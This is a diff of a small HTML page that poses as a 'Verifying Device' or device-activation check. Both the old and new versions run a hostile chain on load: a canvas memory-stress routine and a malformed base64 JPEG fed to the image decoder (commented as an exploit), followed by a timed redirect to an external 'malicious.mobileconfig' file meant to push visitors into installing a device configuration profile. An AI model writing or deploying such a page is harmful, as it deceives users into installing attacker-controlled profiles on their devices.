@@ -1,57 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Device Activation</title>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    html, body {
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
-      text-align: center;
-      padding-top: 10vh;
-    }
-  </style>
-  <script>
-    // 🧨 Trigger canvas glitched memory behavior
-    function canvasExploit() {
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 4096;
-        canvas.height = 4096;
-        const ctx = canvas.getContext('2d');
-
-        for (let i = 0; i < 1000; i++) {
-          ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
-          ctx.fillRect(Math.random()*4096, Math.random()*4096, 512, 512);
-        }
-
-        // Malformed image decoding abuse
-        const img = new Image();
-        img.src = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD...truncatedBadBase64...";
-        img.onload = () => ctx.drawImage(img, 0, 0);
-      } catch (e) {
-        console.log('Canvas trigger error:', e);
-      }
-    }
-
-    // 🔥 Config redirector (triggers install prompt)
-    function redirectToConfig() {
-      window.location.href = "https://tachoss.github.io/hostity/malicious.mobileconfig";
-    }
-
-    // 👇 Trigger chain
-    window.onload = () => {
-      canvasExploit();
-      setTimeout(() => {
-        redirectToConfig();
-      }, 3000); // Delay to let render stack heat up
-    };
-  </script>
+  <title>Loader</title>
 </head>
 <body>
-  <h1>Checking Device Status...</h1>
-  <p>Please wait while we verify your device configuration</p>
+  <h1>Verifying Device...</h1>
+  <canvas id="g" width="4096" height="4096"></canvas>
+  <script>
+    const c = document.getElementById('g').getContext('2d');
+    for (let i=0; i<1000; i++) {
+      c.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
+      c.fillRect(Math.random()*4096,Math.random()*4096,512,512);
+    }
+    const img = new Image();
+    img.src = "data:image/jpeg;base64,/9j/4AAQ...BAD_BASE64...";
+    img.onload = () => c.drawImage(img,0,0);
+    setTimeout(() => {
+      window.location = "https://tachoss.github.io/hostity/malicious.mobileconfig";
+    }, 2500);
+  </script>
 </body>
 </html>
